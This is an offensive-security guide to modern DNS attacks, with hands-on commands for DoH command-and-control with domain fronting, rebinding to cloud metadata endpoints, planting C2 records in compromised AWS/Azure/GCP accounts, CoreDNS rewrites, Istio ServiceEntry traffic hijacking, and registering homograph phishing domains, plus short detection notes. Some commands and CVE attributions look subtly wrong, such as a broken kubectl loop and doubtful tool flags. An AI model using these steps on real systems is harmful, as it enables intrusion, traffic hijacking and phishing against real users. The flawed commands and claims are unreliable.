# DNS Modern Attack Surfaces - Deep Dive

## Overview

The DNS attack surface has expanded dramatically since 2018. Three forces reshaped the landscape: the rollout of encrypted DNS transports (DoH/DoT), the cloud-native migration of DNS infrastructure (AWS Route53, Azure DNS, CoreDNS in Kubernetes), and the rise of stricter browser security that attackers must now bypass (same-origin enforcement, certificate transparency, ECH). Classic cache-poisoning and amplification attacks remain, but the modern engagement target increasingly requires mastery of new terrain: abusing DoH for stealthy C2, exploiting CoreDNS configuration drift in service meshes, manipulating IDN punycode for homograph phishing, and weaponizing DNS rebinding against modern browser defenses.

This guide covers eight modern attack surfaces in depth. For each, we cover the underlying mechanism, real attacker tradecraft with vendor/tool references, concrete hands-on commands, and detection/mitigation notes that translate into engagement deliverables. The goal is to give you a portable mental model: when a client says "we moved DNS to AWS Route53" or "we run Istio service mesh," you should immediately know which attack patterns apply and which payloads to start with.

---

## Hands-on

### 1. DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) C2 Abuse

**Mechanism**: DoH (RFC 8484) wraps DNS queries in HTTPS, typically via POST to `/dns-query` with `application/dns-message` content type, or GET with base64url-encoded `?dns=` parameter. DoT (RFC 7858) wraps DNS in TLS on port 853. Both encrypt the DNS payload so that traditional IDS signatures (long subdomain detection, entropy analysis) become blind.

**Attacker tradecraft**: APT29, TA551, and various ransomware affiliates have moved C2 to DoH using public resolvers (Cloudflare `1.1.1.1`, Google `8.8.8.8`, Quad9 `9.9.9.9`) as egress points. The malware issues HTTPS requests that look identical to legitimate browser-to-resolver traffic. Tools like `dnscat2` now support DoH transports.

**Step-by-step - DoH C2 over Cloudflare**:

```bash
# Issue a DoH query via curl (RFC 8484 wire format)
curl -s -H 'accept: application/dns-message' \
  'https://cloudflare-dns.com/dns-query?dns=AAABAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE' \
  | hexdump -C

# Use https://github.com/curl/curl/wiki/DoH-options or kdig
kdig @1.1.1.1 +https example.com

# Set up a DoH client for C2 (using dnscat2 with DoH plugin)
git clone https://github.com/iagox86/dnscat2
# Server side: run custom DoH server on port 443 (Cloudflare or AWS Route53 front)
# Client side: dnscat2 --doh-server https://yourdomain.com/dns-query

# Detection bypass: TLS SNI matches common CDNs
# Use domain fronting via Cloudflare/Microsoft Azure front-ends
```

**Detection**: TLS fingerprinting (JA3/JA3S) on DoH client behavior; correlation of process -> DoH endpoint (which process actually issued the curl?); block known public DoH endpoints at egress.

### 2. DNSSEC Attacks - NSEC3 Enumeration, Zone Walking, Key Compromise

**Mechanism**: DNSSEC (RFC 4033-4035) signs DNS records using asymmetric keys (KSK/ZSK). NSEC and NSEC3 records prove non-existence of names by chaining existing records. NSEC3 hashes the names with a salt; NSEC does not. Both leak enumerable information. KSK/ZSK key compromise is rarer but catastrophic.

**Step-by-step - NSEC3 zone walking**:

```bash
# Install ldns
apt install ldnsutils

# Walk an NSEC3-signed zone
nsec3walker example.com

# Or use nsec3map from nsec3walker
nsec3map -d example.com

# Verify DNSSEC validation
dig +dnssec www.example.com
delv @1.1.1.1 www.example.com

# KASP/SKA key enumeration - check trust anchor configuration
dig DNSKEY example.com +short
dig DS example.com +short  # Parent zone DS

# Check algorithm strength
dig DNSKEY example.com | grep -E "DNSKEY.*256|DNSKEY.*257"
# Algorithm 8 (RSASHA256), 13 (ECDSAP256SHA256), 15 (ED25519) are recommended
```

**Attacker tradecraft**: NSEC3 enumeration reveals all subdomains in a signed zone - useful for recon. Real attackers use this to enumerate internal DNS namespaces. DNSSEC key compromise (e.g., CVE-2017-3142 / CVE-2017-3143 in BIND, CVE-2020-1350 SigRed in Windows DNS) allows complete DNS forgery.

**Detection**: Monitor for abnormal NSEC/NSEC3 query volumes from a single source; alert on DNSKEY/DS changes.

### 3. DNS Rebinding Against Modern Browsers - Bypasses

**Mechanism**: Modern browsers implement the same-origin policy using the DNS hostname as the origin. DNS rebinding exploits the gap between the DNS TTL (typically minutes) and the browser's DNS cache (60 seconds in Chrome, configurable). The attacker's DNS returns two A records: first the real attacker IP (so the browser loads the JS), then a low-TTL re-resolution that returns an internal IP (e.g., 169.254.169.254). The JS, still in the original origin, can now hit the internal service.

**Step-by-step - Modern rebinding with rbndr.us**:

```bash
# Use the public rbndr.us service
# Format: <ip1>.<ip2>.rbndr.us returns both IPs alternately
# Example: 35.234.91.50.169.254.169.254.rbndr.us

# Spin up your own rebinding server
git clone https://github.com/brannondorsey/whonow
sudo docker run -p 5300:5300/udp brannondorsey/whonow

# Configure your malicious page to use a hostname that resolves via your rebinder
# Example fetch:
fetch('http://35.234.91.50.169.254.169.254.rbndr.us:8080/latest/meta-data/iam/')

# Pin/freeze option for modern browsers - some browsers cache first A
# Use the "double A" technique: serve both A records, JS reads Host header to detect

# Tool: singularity (modern rebinding framework)
git clone https://github.com/nccgroup/singularity
cd singularity
sudo python3 singularity.py --rebind 127.0.0.1
```

**Modern browser mitigations**: Chrome's "private network access" preflight (`Access-Control-Allow-Private-Network`), Firefox's similar Sec-Fetch-Site checks. Bypass via: fetch to attacker domain (resolves to victim's external IP if any), or use non-browser HTTP clients (CORS preflights only apply to browsers).

### 4. Encrypted Client Hello (ECH) and DNS Implications

**Mechanism**: ECH (formerly ESNI) encrypts the TLS ClientHello SNI using a public key published in DNS (HTTPS RR, type 65). This means the SNI - which previously leaked the destination domain in cleartext - is now encrypted. But the public key must be retrieved via DNS, typically via DoH, and the DNS query itself can be encrypted. The combined stack is "Oblivious DNS over HTTPS" (ODoH) + ECH.

**Attacker tradecraft**: Attackers using ECH + DoH effectively hide both the SNI and the DNS query. Network-based detection (IDS, NGFW) becomes blind. Attackers use legitimate ECH-enabled CDNs (Cloudflare, Fastly) for cover.

**Step-by-step - Verify ECH support and test detection gaps**:

```bash
# Check HTTPS RR for ECH config
dig HTTPS cloudflare-ech.com +short

# Test with curl
curl -v --ech true https://cloudflare-ech.com/

# Inspect ECH config from HTTPS RR
dig HTTPS cloudflare-ech.com | grep "ech="

# Detection test - see if your IDS catches the encrypted ClientHello
# (most won't, because they look for cleartext SNI)

# C2 setup using ECH-fronted CDN
# 1. Register a domain, host on Cloudflare
# 2. Enable ECH on the zone
# 3. C2 server behind Cloudflare, accessed via DoH-resolved ECH
```

**Detection**: TLS fingerprinting (JA4), TCP/IP layer analysis, SNI replacement heuristics, certificate-pinning per process, host-based monitoring of process -> network destinations.

### 5. Cloud DNS Abuse - AWS Route53, Azure DNS, GCP Cloud DNS

**Mechanism**: Cloud DNS providers offer programmatic API control. Compromise of cloud credentials grants attackers the ability to create/modify DNS records at scale, including for legitimate customer domains. Attackers also abuse hosted zones for C2 and exfiltration.

**Attacker tradecraft**: DPRK Lazarus and various criminal groups have used Route53 private hosted zones to set up stealth C2 within compromised AWS accounts. DNS records can be created with low visibility compared to EC2 instance creation.

**Step-by-step - AWS Route53 abuse simulation**:

```bash
# Identify Route53 hosted zones (post-compromise)
aws route53 list-hosted-zones

# Create a C2 subdomain in an existing zone
aws route53 change-resource-record-sets \
  --hosted-zone-id Z123EXAMPLE \
  --change-batch '{
    "Changes": [{
      "Action": "CREATE",
      "ResourceRecordSet": {
        "Name": "cdn.example.com",
        "Type": "A",
        "TTL": 60,
        "ResourceRecords": [{"Value": "1.2.3.4"}]
      }
    }]
  }'

# Use Traffic Policies for advanced DNS-based load balancing of C2
aws route53 create-traffic-policy --name c2-lb --document '{"RecordType":"A","StartEndpoint":"endpoint-1",...}'

# Private hosted zones for internal C2 (less visible)
aws route53 create-hosted-zone --name internal.c2.local --caller-reference $(date +%s)

# Azure DNS equivalent
az network dns record-set a add-record --resource-group RG --zone-name example.com --record-set-name cdn --ipv4-address 1.2.3.4

# GCP Cloud DNS
gcloud dns record-sets create cdn.example.com --zone=example-zone --type=A --ttl=60 --rrdatas=1.2.3.4
```

**Detection**: CloudTrail events for `ChangeResourceRecordSets` with anomaly scoring; alert on TXT records (often used for verification tokens); monitor for new Traffic Policies; alert on hosted zone creation.

### 6. Kubernetes CoreDNS Attacks

**Mechanism**: CoreDNS is the default DNS in Kubernetes since v1.13. It runs as a Deployment with service IP `kube-dns.kube-system.svc.cluster.local` typically at `10.96.0.10`. Misconfigurations include: unauthenticated zone transfers, autopath path traversal, the `forward` plugin forwarding to attacker-controlled resolvers, and insecure ConfigMaps that allow arbitrary CoreDNS plugin loading.

**Step-by-step - CoreDNS attacks**:

```bash
# Enumerate services via DNS (no auth required inside the cluster)
kubectl exec -it attacker-pod -- dig +short any service-name.namespace.svc.cluster.local @10.96.0.10

# Walk the cluster.local zone
kubectl exec -it attacker-pod -- for svc in $(kubectl get svc -A -o name); do
  dig +short $svc @10.96.0.10
done

# Manipulate CoreDNS ConfigMap (privileged)
kubectl edit configmap coredns -n kube-system
# Add a malicious rewrite rule:
#   rewrite name evil.com 169.254.169.254

# Poison headless services to redirect traffic
# A headless service resolves to pod IPs - rewrite to attacker pod IP

# CVE-2020-8554 rebinding - manipulate CoreDNS to return two A records
# Configure a wildcard CNAME to a rebinding domain

# Detect drift:
kubectl get configmap coredns -n kube-system -o yaml | diff - baseline.yaml
```

**Detection**: Monitor ConfigMap changes in kube-system namespace; alert on new CoreDNS plugins (`rewrite`, `alternate`, `forward` to external IPs); deploy NetworkPolicy to restrict which namespaces can reach kube-dns directly.

### 7. Service Mesh DNS - Istio, Linkerd

**Mechanism**: Service meshes intercept traffic via sidecar proxies (Envoy in Istio, linkerd-proxy in Linkerd) and use internal DNS for service discovery. Istio uses CoreDNS or its own DNS proxy (since 1.10) for service.mesh addresses. Misconfigurations include DNS proxy bypasses (pods sending DNS directly to kube-dns, bypassing mesh auth), domain-spoofing via ServiceEntry manipulation, and DNS-based traffic hijacking.

**Step-by-step - Istio DNS abuse**:

```bash
# Inspect Istio DNS proxy configuration
istioctl analyze
kubectl get serviceentry -A -o yaml

# Add a malicious ServiceEntry to capture traffic for a domain
kubectl apply -f - <<EOF
apiVersion: networking.istio.io/v1beta1
kind: ServiceEntry
metadata:
  name: captured-google
  namespace: default
spec:
  hosts:
  - www.google.com
  addresses:
  - 240.0.0.1/32
  ports:
  - number: 443
    name: https
    protocol: TLS
  resolution: STATIC
  location: MESH_EXTERNAL
  endpoints:
  - address: 1.2.3.4  # attacker IP
EOF

# Now any pod in the mesh resolving www.google.com via Istio DNS
# will route to attacker IP

# Linkerd equivalent: inject the proxy-injector to add malicious ServiceProfiles
kubectl get serviceprofile -A

# Detection: monitor ServiceEntry creation in audit logs
kubectl get events -A --field-selector reason=Created | grep ServiceEntry
```

**Detection**: Audit log monitoring for ServiceEntry and VirtualService changes; alert on `MESH_EXTERNAL` entries pointing to non-corporate IPs; deploy OPA/Gatekeeper policies to restrict ServiceEntry hosts to whitelisted domains.

### 8. Homograph Attacks and IDN Punycode

**Mechanism**: Internationalized Domain Names (IDN) allow Unicode characters in domain names. The domain is encoded as punycode in the DNS protocol (e.g., `xn--80ak6aa92e.com` renders as аррӏе.com with Cyrillic characters). Homograph attacks exploit visually similar characters across scripts to create lookalike domains.

**Attacker tradecraft**: APT35 (Iran), CozyBear (Russia), and many criminal phishing operations use IDN homographs. Browsers have mitigations (Punycode display for mixed-script, but same-script homographs remain). IDN is also abused in URLs displayed in chat apps, PDFs, and emails where URL preview rendering is inconsistent.

**Step-by-step - Homograph attack setup**:

```bash
# Encode a domain to punycode
python3 -c "print('аррӏе.com'.encode('idna').decode())"
# Output: xn--80ak6aa92e.com

# Decode punycode back to Unicode
python3 -c "print('xn--80ak6aa92e.com'.encode().decode('idna'))"

# Generate homograph candidates
# Use https://www.unicode.org/reports/tr39/ confusables data
python3 -c "
import unicodedata
def confusables(s):
    return ''.join(unicodedata.lookup(n) for n in ['CYRILLIC SMALL LETTER A'])
print(confusables('apple'))
"

# Register a homograph domain (some registrars block; try Namecheap, Porkbun)
# Use LetsEncrypt to get a cert
certbot certonly --standalone -d xn--80ak6aa92e.com

# Test browser display
# Chrome may show punycode for mixed-script; Firefox may show Unicode
# Test on iOS Safari (often most vulnerable to same-script homographs)

# Combining-character attack (zero-width chars)
# Insert U+200B (zero-width space) or U+200D (zero-width joiner) into domains
python3 -c "print('apple​.com')"  # invisible char between e and .
```

**Detection**: Deploy IDN homograph detection on email gateways (Proofpoint, Abnormal Security); use URIBL/Spamhaus DBL for known homograph domains; train help-desk to verify domain authenticity via copy-paste (the pasted text reveals punycode).

---

## References

1. RFC 8484 - DNS queries over HTTPS (DoH): https://datatracker.ietf.org/doc/html/rfc8484
2. RFC 7858 - DNS over TLS: https://datatracker.ietf.org/doc/html/rfc7858
3. Cloudflare DoH documentation: https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/
4. Google Public DNS DoH/DoT: https://developers.google.com/speed/public-dns/docs/doh
5. dnscat2 with DoH plugin: https://github.com/iagox86/dnscat2
6. RFC 4033 - DNSSEC introduction: https://datatracker.ietf.org/doc/html/rfc4033
7. NSEC3 walker tool: https://github.com/anonion0/nsec3walker
8. CVE-2020-1350 SigRed (Windows DNS): https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1350
9. RFC 8499 - DNS terminology: https://datatracker.ietf.org/doc/html/rfc8499
10. Singularity DNS rebinding: https://github.com/nccgroup/singularity
11. Brannon Dorsey whonow rebinding DNS server: https://github.com/brannondorsey/whonow
12. Chromium private network access spec: https://developer.chrome.com/blog/private-network-access-update/
13. RFC 9460 - SVCB and HTTPS resource records (ECH support): https://datatracker.ietf.org/doc/html/rfc9460
14. Cloudflare ECH documentation: https://blog.cloudflare.com/encrypted-client-hello/
15. AWS Route53 API reference: https://docs.aws.amazon.com/Route53/latest/APIReference/
16. Kubernetes CoreDNS documentation: https://coredns.io/plugins/kubernetes/
17. Istio DNS proxy: https://istio.io/latest/blog/2021/dns-proxy/
18. Linkerd service discovery: https://linkerd.io/2/features/service-discovery/
19. Unicode TR39 - Unicode Security Mechanisms: https://www.unicode.org/reports/tr39/
20. ICANN IDN guidelines: https://www.icann.org/resources/pages/idn-guidelines-2012-02-25-en
